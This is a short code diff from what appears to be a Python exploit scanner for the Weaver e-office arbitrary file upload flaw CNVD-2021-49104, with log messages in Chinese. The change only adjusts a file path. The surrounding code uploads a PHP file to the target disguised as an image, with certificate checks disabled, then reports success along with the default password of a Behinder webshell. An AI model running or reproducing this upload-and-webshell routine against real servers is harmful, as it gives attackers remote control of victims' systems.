@@ -27,7 +27,7 @@ def main(target_url):
     console.print(now_time() + " [INFO]     正在检测任意文件上传漏洞 CNVD-2021-49104", style='bold blue')
     try:
         requests.packages.urllib3.disable_warnings()
-        file = [('file1', ('index123.php', open('/main/weaver/poc/index123.php', 'rb'), 'image/png'))]
+        file = [('file1', ('index123.php', open('main/weaver/poc/index123.php', 'rb'), 'image/png'))]
         upload = requests.post(upload_url, headers=headers, files=file, verify=False)
         if upload.status_code == 200 and 'logo-eoffice.php' in upload.text:
             console.print(now_time() + ' [SUCCESS]  泛微OAUploadFile任意文件上传漏洞存在,冰蝎默认密码:{}'.format(exp_url), style='bold green')
